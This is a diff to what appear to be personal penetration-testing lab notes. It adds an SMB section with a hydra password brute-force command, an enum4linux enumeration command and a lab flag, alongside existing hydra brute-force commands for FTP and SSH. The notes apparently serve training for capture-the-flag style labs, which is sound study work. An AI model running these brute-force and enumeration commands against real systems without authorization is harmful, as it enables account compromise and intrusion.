@@ -321,7 +321,7 @@ Script:
 hydra -L /usr/share/metasploit-framework/data/wordlists/common_user.txt -P usr/share/metasploit-framework/data/wordlists/unix_passwords.txt $ip -t 4 ftp
 ```
 
-## Exploiting Ssh
+### Exploiting SSH
 Default attack:  Bruteforce with hydra
 Script: 
 ```bash
@@ -330,3 +330,33 @@ hydra -L /usr/share/metasploit-framework/data/wordlists/common_user.txt -P usr/s
 
 eg lab:
 flag: eb09cc6f1cd72756da145892892fbf5a
+
+### Exploiting SMb
+Default attack:  Bruteforce with hydra
+Script: 
+```bash
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_user.txt -P usr/share/metasploit-framework/data/wordlists/common_passwords.txt $ip smb
+```
+
+Other utitiliy for exploiting smb is
+```enum4linux```
+
+Go to command for this is
+```bash
+enum4linux -a -u $(username) -p $(password) $(ip)
+```
+
+eg lab:
+flag : 2727069bc058053bd561ce372721c92e
+
+
+
+## Linux Privillege escialtion
+
+
+
+
+
+
+
+
